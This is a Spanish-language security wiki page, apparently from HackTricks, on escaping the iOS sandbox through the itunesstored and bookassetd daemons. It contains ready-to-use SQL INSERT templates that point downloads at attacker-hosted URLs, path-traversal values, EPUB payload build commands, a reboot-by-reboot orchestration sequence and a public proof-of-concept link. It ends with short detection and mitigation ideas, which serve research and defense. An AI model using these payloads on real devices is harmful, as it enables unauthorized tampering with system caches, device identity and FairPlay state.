# itunesstored & bookassetd Sandbox Escape

{{#include ../../banners/hacktricks-training.md}}

## Resumen

Investigaciones recientes muestran que dos demonios preinstalados de iOS, **`itunesstored`** (gestor de descargas) y **`bookassetd`** (gestor de assets de Books / iBooks), confían ciegamente en metadatos SQLite que pueden ser escritos por el usuario. Al colocar archivos `downloads.28.sqlitedb` y `BLDatabaseManager.sqlite` creados ad hoc junto con un archivo EPUB mínimo, un atacante que pueda escribir bajo `/var/mobile/Media/` puede forzar a estos demonios a realizar **escrituras arbitrarias de archivos en la mayoría de rutas propiedad de `mobile` dentro de `/private/var/`**. Los primitivos sobreviven a reinicios y permiten manipular caches de system group como `systemgroup.com.apple.mobilegestaltcache` para falsear propiedades del dispositivo o persistir configuración.

Propiedades clave:

- Funciona en dispositivos hasta al menos **iOS 26.2b1** (probado en iPhone 12 / iOS 26.0.1).
- Los objetivos escribibles incluyen caches de `SystemGroup`, `/private/var/mobile/Library/FairPlay`, `/private/var/mobile/Media`, y otros archivos propiedad de `mobile`. Las escrituras a archivos propiedad de `root` fallan.
- Solo requiere acceso a nivel AFC (copia de archivos por USB) o cualquier foothold que permita reemplazar las DB SQLite objetivo y subir payloads.

## Modelo de amenaza y requisitos

1. Acceso local al sistema de archivos a `/var/mobile/Media/Downloads/` y `/var/mobile/Media/Books/` (vía clientes AFC como 3uTools, i4.cn, o [`afcclient`](https://github.com/emonti/afcclient) por USB, o cualquier compromiso previo).
2. Un servidor HTTP que aloje archivos del atacante (`BLDatabaseManager.sqlite`, `iTunesMetadata.plist`, EPUB diseñado) accesible mediante URLs como `https://ATTACKER_HOST/fileprovider.php?type=...`.
3. Capacidad para reiniciar el dispositivo varias veces para que cada demonio recargue su base de datos.
4. Conocimiento del UUID del SystemGroup de Books para que la escritura de la Etapa 1 caiga en el contenedor correcto (se encuentra vía syslog).

## Etapa 1 – Abusar `downloads.28.sqlitedb` vía `itunesstored`

`itunesstored` procesa `/var/mobile/Media/Downloads/downloads.28.sqlitedb`. La tabla `asset` almacena la metadata de URL + destino y se trata como entrada confiable. Crear una fila que apunte a una URL del atacante y establezca `local_path` a `.../Documents/BLDatabaseManager/BLDatabaseManager.sqlite` dentro del SystemGroup de Books hace que `itunesstored` descargue y sobrescriba la base de datos de Books con contenido del atacante en el arranque.

### Localizar el UUID del SystemGroup de Books

1. Recopila un archivo de syslog con [`pymobiledevice3`](https://github.com/doronz88/pymobiledevice3):
```bash
pymobiledevice3 syslog collect logs.logarchive
```
2. Abre `logs.logarchive` en **Console.app** y busca `bookassetd [Database]: Store is at file:///private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite`.
3. Anota `<UUID>` y sustitúyelo en la carga útil SQL.

### Malicious `asset` row

<details>
<summary>Stage 1 INSERT template</summary>
```sql
INSERT INTO "main"."asset" (
"pid","download_id","asset_order","asset_type","bytes_total",
"url","local_path","destination_url","path_extension","retry_count",
"http_method","initial_odr_size","is_discretionary","is_downloaded",
"is_drm_free","is_external","is_hls","is_local_cache_server",
"is_zip_streamable","processing_types","video_dimensions",
"timeout_interval","store_flavor","download_token","blocked_reason",
"avfoundation_blocked","service_type","protection_type",
"store_download_key","etag","bytes_to_hash","hash_type","server_guid",
"file_protection","variant_id","hash_array","http_headers",
"request_parameters","body_data","body_data_file_path","sinfs_data",
"dpinfo_data","uncompressed_size","url_session_task_id"
) VALUES (
1234567890,6936249076851270150,0,'media',NULL,
'https://ATTACKER_HOST/fileprovider.php?type=sqlite',
'/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite',
NULL,'epub',6,'GET',NULL,0,0,0,1,0,0,0,0,
NULL,60,NULL,466440000,0,0,0,0,'',NULL,NULL,0,
NULL,NULL,NULL,X'62706c6973743030a1015f1020...',NULL,NULL,NULL,NULL,NULL,NULL,0,1
);
```
</details>

**Campos relevantes:**

- `url`: endpoint controlado por el atacante que devuelve el malicioso `BLDatabaseManager.sqlite`.
- `local_path`: archivo `BLDatabaseManager.sqlite` del grupo del sistema Books determinado arriba.
- Control flags: mantener los valores por defecto (`asset_type='media'`, `path_extension='epub'`, booleanos establecidos en 0/1 como en la plantilla) para que el daemon acepte la tarea.

### Despliegue

1. Eliminar entradas obsoletas `/var/mobile/Media/Downloads/*` para evitar condiciones de carrera.
2. Reemplazar `downloads.28.sqlitedb` con la BD manipulada vía AFC.
3. Reiniciar → `itunesstored` descarga la base de datos de la Etapa 2 y deja `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`.
4. Copiar ese plist a `/var/mobile/Media/Books/iTunesMetadata.plist`; la Etapa 2 lo espera en esa ubicación.

## Etapa 2 – Abusar `BLDatabaseManager.sqlite` mediante `bookassetd`

`bookassetd` tiene permisos más amplios sobre el sistema de archivos y confía en la tabla `ZBLDOWNLOADINFO`. Al insertar una fila de compra falsa que referencia attacker-controlled URLs y una traversal en `ZPLISTPATH`, el daemon descarga tu EPUB a `/var/mobile/Media/Books/asset.epub` y luego desempaqueta los metadatos en **cualquier ruta propiedad de `mobile` accesible mediante secuencias de escape `../../..`**.

### Fila maliciosa en `ZBLDOWNLOADINFO`

<details>
<summary>Plantilla INSERT de la Etapa 2</summary>
```sql
INSERT INTO "ZBLDOWNLOADINFO" (
"Z_PK","Z_ENT","Z_OPT","ZACCOUNTIDENTIFIER","ZCLEANUPPENDING",
"ZFAMILYACCOUNTIDENTIFIER","ZISAUTOMATICDOWNLOAD","ZISLOCALCACHESERVER",
"ZISPURCHASE","ZISRESTORE","ZISSAMPLE","ZISZIPSTREAMABLE",
"ZNUMBEROFBYTESTOHASH","ZPERSISTENTIDENTIFIER","ZPUBLICATIONVERSION",
"ZSERVERNUMBEROFBYTESTOHASH","ZSIZE","ZSTATE","ZSTOREIDENTIFIER",
"ZSTOREPLAYLISTIDENTIFIER","ZLASTSTATECHANGETIME","ZPURCHASEDATE",
"ZSTARTTIME","ZARTISTNAME","ZARTWORKPATH","ZASSETPATH",
"ZBUYPARAMETERS","ZCANCELDOWNLOADURL","ZCLIENTIDENTIFIER",
"ZCOLLECTIONARTISTNAME","ZCOLLECTIONTITLE","ZDOWNLOADID",
"ZDOWNLOADKEY","ZENCRYPTIONKEY","ZEPUBRIGHTSPATH","ZFILEEXTENSION",
"ZGENRE","ZHASHTYPE","ZKIND","ZMD5HASHSTRINGS","ZORIGINALURL",
"ZPERMLINK","ZPLISTPATH","ZSALT","ZSUBTITLE","ZTHUMBNAILIMAGEURL",
"ZTITLE","ZTRANSACTIONIDENTIFIER","ZURL","ZRACGUID","ZDPINFO",
"ZSINFDATA","ZFILEATTRIBUTES"
) VALUES (
1,2,3,0,0,0,0,'',NULL,NULL,NULL,NULL,
0,0,0,NULL,4648,2,'765107108',NULL,
767991550.119197,NULL,767991353.245275,NULL,NULL,
'/private/var/mobile/Media/Books/asset.epub',
'productType=PUB&salableAdamId=765107106&...',
'https://p19-buy.itunes.apple.com/...',
'4GG2695MJK.com.apple.iBooks','Sebastian Saenz','Cartas de Amor a la Luna',
'../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library',
NULL,NULL,NULL,NULL,'Contemporary Romance',NULL,'ebook',NULL,NULL,NULL,
'/private/var/mobile/Media/Books/iTunesMetadata.plist',NULL,
'Cartas de Amor a la Luna','https://ATTACKER_HOST/fileprovider.php?type=gestalt',
'Cartas de Amor a la Luna','J19N_PUB_190099164604738',
'https://ATTACKER_HOST/fileprovider.php?type=gestalt2',NULL,NULL,NULL,NULL
);
```
</details>

Campos importantes:

- `ZASSETPATH`: ubicación en disco del EPUB controlada por el atacante.
- `ZURL`/`ZPERMLINK`: URLs del atacante que alojan el EPUB y el plist auxiliar.
- `ZPLISTPATH`: `../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library` – la **path traversal base** añadida a los archivos extraídos del EPUB. Ajusta la profundidad de traversal para alcanzar el SystemGroup objetivo deseado.
- Los metadatos de compra (`ZSTOREIDENTIFIER`, nombres, timestamps) imitan entradas legítimas para que el daemon no descarte la fila.

Después de copiar la DB maliciosa en `/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite` (gracias a Stage 1) y reiniciar dos veces, `bookassetd` (1) descargará el EPUB, (2) lo procesará y escribirá el plist derivado en la ruta recorrida.

## Creación del EPUB payload

`bookassetd` respeta el formato EPUB ZIP: `mimetype` debe ser la primera entrada sin comprimir. Para mapear el contenido del EPUB al caché de MobileGestalt, crea un árbol de directorios que refleje la ruta deseada relativa a `ZPLISTPATH`.
```
Caches/
├── mimetype
└── com.apple.MobileGestalt.plist
```
Crear el archivo:
```bash
zip -X0 hax.epub Caches/mimetype
zip -Xr9D hax.epub Caches/com.apple.MobileGestalt.plist
```
- `mimetype` typically contains the literal `application/epub+zip`.
- `Caches/com.apple.MobileGestalt.plist` holds the attacker-controlled payload that will land at `.../Library/Caches/com.apple.MobileGestalt.plist`.

## Flujo de orquestación

1. **Preparar archivos** en el servidor HTTP del atacante y crear ambos SQLite DBs con valores específicos de host/UUID.
2. **Reemplazar `downloads.28.sqlitedb`** en el dispositivo y reiniciar → Etapa 1 descarga el `BLDatabaseManager.sqlite` malicioso y emite `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`.
3. **Copiar `iTunesMetadata.plist`** a `/var/mobile/Media/Books/iTunesMetadata.plist` (repetir si el daemon lo elimina).
4. **Reiniciar de nuevo** → `bookassetd` descarga `asset.epub` a `/var/mobile/Media/Books/` usando los metadatos de la Etapa 2.
5. **Reiniciar por tercera vez** → `bookassetd` procesa el asset descargado, sigue `ZPLISTPATH` y escribe el contenido del EPUB en la ruta SystemGroup objetivo (p. ej., `com.apple.MobileGestalt.plist`).
6. **Verificar** leyendo el plist sobreescrito u observando que las propiedades derivadas de MobileGestalt (identificador de modelo, flags de activación, etc.) cambien en consecuencia.

El mismo patrón permite dejar archivos bajo otras caches propiedad de `mobile`, como el estado de FairPlay o directorios de persistencia, habilitando manipulaciones sigilosas sin necesitar un exploit de kernel.

## Herramientas y notas operativas

- **`pymobiledevice3 syslog collect logs.logarchive`** – extraer log archives para descubrir el Books SystemGroup UUID.
- **Console.app** – filtrar por `bookassetd [Database]: Store is at ...` para recuperar la ruta exacta del contenedor.
- **AFC clients (`afcclient`, 3uTools, i4.cn)** – push/pull de SQLite DBs y archivos plist por USB sin jailbreak.
- **`zip`** – imponer restricciones de ordenamiento de EPUB al empaquetar payloads.
- **Public PoC** – <https://github.com/hanakim3945/bl_sbx> ships baseline SQLite/EPUB templates you can customize.

## Ideas de detección y mitigación

- Tratar `downloads.28.sqlitedb` y `BLDatabaseManager.sqlite` como input no confiable: validar que `local_path` / `ZPLISTPATH` permanezcan dentro de sandboxes aprobadas y rechazar paths totalmente cualificados o tokens de traversal.
- Monitorear escrituras AFC que reemplacen estas bases de datos o descargas inesperadas iniciadas por `itunesstored` / `bookassetd` poco después del arranque.
- Endurecer el unpacking de `bookassetd` para usar `realpath()` en el objetivo de salida y asegurar que no pueda escapar del contenedor Books antes de escribir archivos.
- Restringir canales de copia de archivos AFC / USB o requerir interacción del usuario antes de permitir el reemplazo de archivos de metadata de Books/iTunes.

## Referencias

- [itunesstored & bookassetd sbx escape](https://hanakim3945.github.io/posts/download28_sbx_escape/)
- [bl_sbx PoC repository](https://github.com/hanakim3945/bl_sbx)

{{#include ../../banners/hacktricks-training.md}}
